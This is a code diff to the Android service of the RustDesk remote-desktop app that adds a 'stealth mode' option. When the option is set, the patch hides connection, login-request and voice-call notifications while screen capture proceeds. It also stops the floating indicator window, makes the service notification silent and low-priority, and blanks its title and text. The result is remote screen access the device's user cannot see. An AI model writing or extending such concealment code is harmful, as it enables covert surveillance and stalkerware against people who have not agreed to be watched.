@@ -132,13 +132,18 @@ class MainService : Service() {
                     } else {
                         translate("Share screen")
                     }
+                    val stealth = isStealthMode()
                     if (authorized) {
                         if (!isFileTransfer && !isStart) {
                             startCapture()
                         }
-                        onClientAuthorizedNotification(id, type, username, peerId)
+                        if (!stealth) {
+                            onClientAuthorizedNotification(id, type, username, peerId)
+                        }
                     } else {
-                        loginRequestNotification(id, type, username, peerId)
+                        if (!stealth) {
+                            loginRequestNotification(id, type, username, peerId)
+                        }
                     }
                 } catch (e: JSONException) {
                     e.printStackTrace()
@@ -154,7 +159,14 @@ class MainService : Service() {
                     val incomingVoiceCall = jsonObject["incoming_voice_call"] as Boolean
                     if (!inVoiceCall) {
                         if (incomingVoiceCall) {
-                            voiceCallRequestNotification(id, "Voice Call Request", username, peerId)
+                            if (!isStealthMode()) {
+                                voiceCallRequestNotification(
+                                    id,
+                                    "Voice Call Request",
+                                    username,
+                                    peerId
+                                )
+                            }
                         } else {
                             if (!audioRecordHandle.switchOutVoiceCall(mediaProjection)) {
                                 Log.e(logTag, "switchOutVoiceCall fail")
@@ -234,10 +246,17 @@ class MainService : Service() {
     private lateinit var notificationChannel: String
     private lateinit var notificationBuilder: NotificationCompat.Builder
 
+    private fun isStealthMode(): Boolean {
+        return FFI.getLocalOption("stealth-mode") == "Y"
+    }
+
     override fun onCreate() {
         super.onCreate()
         Log.d(logTag,"MainService onCreate, sdk int:${Build.VERSION.SDK_INT} reuseVirtualDisplay:$reuseVirtualDisplay")
         FFI.init(this)
+        if (isStealthMode()) {
+            stopService(Intent(this, FloatingWindowService::class.java))
+        }
         HandlerThread("Service", Process.THREAD_PRIORITY_BACKGROUND).apply {
             start()
             serviceLooper = looper
@@ -604,14 +623,17 @@ class MainService : Service() {
     private fun initNotification() {
         notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
         notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val channelId = "RustDesk"
+            val channelId = "RustDeskService"
             val channelName = "RustDesk Service"
             val channel = NotificationChannel(
                 channelId,
-                channelName, NotificationManager.IMPORTANCE_HIGH
+                channelName, NotificationManager.IMPORTANCE_LOW
             ).apply {
                 description = "RustDesk Service Channel"
             }
+            channel.enableVibration(false)
+            channel.setSound(null, null)
+            channel.setShowBadge(false)
             channel.lightColor = Color.BLUE
             channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
             notificationManager.createNotificationChannel(channel)
@@ -624,6 +646,7 @@ class MainService : Service() {
 
     @SuppressLint("UnspecifiedImmutableFlag")
     private fun createForegroundNotification() {
+        val stealth = isStealthMode()
         val intent = Intent(this, MainActivity::class.java).apply {
             flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
             action = Intent.ACTION_MAIN
@@ -638,11 +661,12 @@ class MainService : Service() {
         val notification = notificationBuilder
             .setOngoing(true)
             .setSmallIcon(R.mipmap.ic_stat_logo)
-            .setDefaults(Notification.DEFAULT_ALL)
-            .setAutoCancel(true)
-            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
-            .setContentTitle(DEFAULT_NOTIFY_TITLE)
-            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
+            .setAutoCancel(false)
+            .setSilent(true)
+            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setShowWhen(false)
+            .setContentTitle(if (stealth) "" else DEFAULT_NOTIFY_TITLE)
+            .setContentText(if (stealth) "" else translate(DEFAULT_NOTIFY_TEXT))
             .setOnlyAlertOnce(true)
             .setContentIntent(pendingIntent)
             .setColor(ContextCompat.getColor(this, R.color.primary))
